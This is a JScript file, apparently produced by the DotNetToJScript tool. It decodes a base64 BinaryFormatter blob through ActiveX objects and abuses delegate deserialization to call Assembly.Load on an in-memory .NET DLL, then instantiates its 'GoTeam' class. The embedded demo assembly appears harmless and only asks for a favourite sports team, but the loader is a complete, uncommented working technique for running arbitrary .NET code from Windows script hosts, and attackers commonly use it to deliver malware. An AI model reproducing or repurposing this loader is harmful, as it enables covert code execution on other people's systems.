function setversion() {
}
function debug(s) {}
function base64ToStream(b) {
        var enc = new ActiveXObject("System.Text.ASCIIEncoding");
        var length = enc.GetByteCount_2(b);
        var ba = enc.GetBytes_4(b);
        var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
        ba = transform.TransformFinalBlock(ba, 0, length);
        var ms = new ActiveXObject("System.IO.MemoryStream");
        ms.Write(ba, 0, (length / 4) * 3);
        ms.Position = 0;
        return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMA0CSoWgAAAAAA"+
"AAAA4AACIQsBCwAACgAAAAYAAAAAAADeKAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAhCgA"+
"AFcAAAAAQAAAuAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAEwnAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAADkCAAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAuAMAAABA"+
"AAAABAAAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAMAoAAAAAAAASAAAAAIABQDMIAAAgAYAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzADAFQAAAAB"+
"AAARAigQAAAKAAByAQAAcCgRAAAKACgSAAAKCgZyRQAAcCgTAAAKFv4BCwctDwByUwAAcCgRAAAK"+
"AAArGAByZQAAcAZybQAAcCgUAAAKKBEAAAoAAAAqYgByZQAAcANybQAAcCgUAAAKKBEAAAoAKgAA"+
"AEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAPQBAAAjfgAAYAIAAIQCAAAjU3Ry"+
"aW5ncwAAAADkBAAAdAAAACNVUwBYBQAAEAAAACNHVUlEAAAAaAUAABgBAAAjQmxvYgAAAAAAAAAC"+
"AAABRxUCAAkAAAAA+iUzABYAAAEAAAATAAAAAgAAAAIAAAABAAAAFAAAAA4AAAABAAAAAQAAAAEA"+
"AAAAAAoAAQAAAAAABgA1AC4ABgBfAE0ABgB2AE0ABgCTAE0ABgCyAE0ABgDLAE0ABgDkAE0ABgD/"+
"AE0ABgAaAU0ABgBSATMBBgBmATMBBgB0AU0ABgCNAU0ABgC9AaoBOwDRAQAABgAAAuABBgAgAuAB"+
"BgBOAi4ABgBpAi4AAAAAAAEAAAAAAAEAAQABABAAHgAAAAUAAQABAFAgAAAAAIYYPAAKAAEAsCAA"+
"AAAAhgBCAA4AAQAAAAEASAARADwADgAZADwADgAhADwADgApADwADgAxADwADgA5ADwADgBBADwA"+
"DgBJADwADgBRADwAEwBZADwADgBhADwADgBpADwADgBxADwAGACBADwAHgCJADwACgAJADwACgCR"+
"AFYCKQCRAGACLgCZAHACMgCZAHwCOAAuADMAiQAuAAsARAAuABMAWQAuABsAgwAuACMAgwAuACsA"+
"RAAuAFMArgAuADsAgwAuAEsAgwAuAGsA5QAuAHsA9wAuAGMA2AAuAHMA7gBDAEsAIwA/AASAAAAB"+
"AAAAAAAAAAAAAAAAAD4CAAACAAAAAAAAAAAAAAABACUAAAAAAAAAADxNb2R1bGU+AEV4YW1wbGVB"+
"c3NlbWJseS5kbGwAR29UZWFtAG1zY29ybGliAFN5c3RlbQBPYmplY3QALmN0b3IAU2F5R28AdGVh"+
"bQBTeXN0ZW0uUmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5RGVzY3Jp"+
"cHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29t"+
"cGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRB"+
"dHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJlQXR0cmli"+
"dXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEd1"+
"aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25B"+
"dHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5n"+
"TW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRp"+
"b25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEV4YW1wbGVBc3NlbWJs"+
"eQBDb25zb2xlAFdyaXRlTGluZQBSZWFkTGluZQBTdHJpbmcAb3BfRXF1YWxpdHkAQ29uY2F0AAAA"+
"Q0UAbgB0AGUAcgAgAHkAbwB1AHIAIABmAGEAdgBvAHIAaQB0AGUAIABzAHAAbwByAHQAcwAgAHQA"+
"ZQBhAG0AOgAgAAANcwBhAGkAbgB0AHMAABFXAGgAbwAgAGQAYQB0ACEAAAdHAG8AIAAAAyEAAAAA"+
"AIsBecsuLeZHscIaqotkyj8ACLd6XFYZNOCJAyAAAQQgAQEOBCABAQIFIAEBET0EIAEBCAUBAAEA"+
"AAQAAQEOAwAADgUAAgIODgYAAw4ODg4EBwIOAhQBAA9FeGFtcGxlQXNzZW1ibHkAACkBACRFeGFt"+
"cGxlIEFzc2VtYmx5IGZvciBEb3ROZXRUb0pTY3JpcHQAAAUBAAAAACQBAB9Db3B5cmlnaHQgwqkg"+
"SmFtZXMgRm9yc2hhdyAyMDE3AAApAQAkNTY1OThmMWMtNmQ4OC00OTk0LWEzOTItYWYzMzdhYmU1"+
"Nzc3AAAMAQAHMS4wLjAuMAAACAEABwEAAAAACAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0"+
"aW9uVGhyb3dzAQAAAAAAANAkqFoAAAAAAgAAABwBAABoJwAAaAkAAFJTRFP3gpa+JqEVQqMxBa6O"+
"gizoAwAAAGM6XFVzZXJzXGtib3RhXERlc2t0b3BcRG90TmV0VG9KU2NyaXB0XEV4YW1wbGVBc3Nl"+
"bWJseVxvYmpcRGVidWdcRXhhbXBsZUFzc2VtYmx5LnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArCgAAAAAAAAAAAAAzigAAAAg"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAoAAAAAAAAAAAAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBt"+
"c2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAA"+
"AAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAYAMAAAAAAAAAAAAAYAM0AAAA"+
"VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAA"+
"AD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A"+
"AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBMACAAABAFMAdAByAGkAbgBn"+
"AEYAaQBsAGUASQBuAGYAbwAAAJwCAAABADAAMAAwADAAMAA0AGIAMAAAAGQAJQABAEMAbwBtAG0A"+
"ZQBuAHQAcwAAAEUAeABhAG0AcABsAGUAIABBAHMAcwBlAG0AYgBsAHkAIABmAG8AcgAgAEQAbwB0"+
"AE4AZQB0AFQAbwBKAFMAYwByAGkAcAB0AAAAAABIABAAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAA"+
"dABpAG8AbgAAAAAARQB4AGEAbQBwAGwAZQBBAHMAcwBlAG0AYgBsAHkAAAAwAAgAAQBGAGkAbABl"+
"AFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAABIABQAAQBJAG4AdABlAHIAbgBhAGwA"+
"TgBhAG0AZQAAAEUAeABhAG0AcABsAGUAQQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAABkAB8AAQBM"+
"AGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIABKAGEA"+
"bQBlAHMAIABGAG8AcgBzAGgAYQB3ACAAMgAwADEANwAAAAAAUAAUAAEATwByAGkAZwBpAG4AYQBs"+
"AEYAaQBsAGUAbgBhAG0AZQAAAEUAeABhAG0AcABsAGUAQQBzAHMAZQBtAGIAbAB5AC4AZABsAGwA"+
"AABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEUAeABhAG0AcABsAGUAQQBzAHMAZQBt"+
"AGIAbAB5AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4A"+
"MAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAw"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAADgOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"+
"bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA";
var entry_class = 'GoTeam';

try {
        setversion();
        var stm = base64ToStream(serialized_obj);
        var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
        var al = new ActiveXObject('System.Collections.ArrayList');
        var d = fmt.Deserialize_2(stm);
        al.Add(undefined);
        var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

} catch (e) {
    debug(e.message);
}
